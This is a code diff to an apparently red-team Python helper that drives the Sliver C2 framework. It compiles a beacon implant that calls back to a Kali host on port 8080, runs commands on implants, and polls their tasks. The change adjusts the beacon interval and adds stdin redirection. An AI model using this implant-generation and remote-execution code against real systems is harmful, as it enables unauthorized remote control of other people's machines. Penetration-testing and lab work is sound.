@@ -218,10 +218,10 @@ def ensure_beacon_compiled(kali_ip):
     """Verify that the target Sliver beacon implant is compiled at /tmp.
     If missing, triggers a background garble compilation via sliver-client.
     """
-    # Ensure C2 Beacon implant is compiled (2s interval for responsive execution)
+    # Ensure C2 Beacon implant is compiled (5s interval for responsive execution)
     if not os.path.exists("/tmp/beacon_implant"):
-        log(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 2s sleep...")
-        rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 2 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
+        log(f"[*] C2 Beacon implant not found. Compiling targeting {kali_ip}:8080 with 5s sleep...")
+        rc_content = f"generate beacon --http {kali_ip}:8080 --seconds 5 --os linux --arch amd64 --save /tmp/beacon_implant\nexit\n"
         rc_path = "/tmp/compile_beacon.rc"
         with open(rc_path, "w") as f:
             f.write(rc_content)
@@ -425,6 +425,7 @@ def _list_sliver(query: str, timeout: int = 10) -> str:
         res = subprocess.run(
             ["sliver-client", "--rc", rc_path],
             capture_output=True, text=True, timeout=timeout,
+            stdin=subprocess.DEVNULL,
         )
         return res.stdout
     except Exception as e:
@@ -444,7 +445,8 @@ def _poll_beacon_task(beacon_id: str, task_id: str, max_polls: int = 60, poll_in
         try:
             res = subprocess.run(
                 ["sliver-client", "--rc", rc_path],
-                capture_output=True, text=True, timeout=30
+                capture_output=True, text=True, timeout=30,
+                stdin=subprocess.DEVNULL,
             )
             fetch_out = res.stdout
             if "✅ Completed" in fetch_out:
@@ -477,7 +479,8 @@ def sliver_exec(implant_id: str, *commands: str, timeout: int = 120, poll_interv
         try:
             res = subprocess.run(
                 ["sliver-client", "--rc", rc_path],
-                capture_output=True, text=True, timeout=timeout
+                capture_output=True, text=True, timeout=timeout,
+                stdin=subprocess.DEVNULL,
             )
             output = res.stdout
         except subprocess.TimeoutExpired:
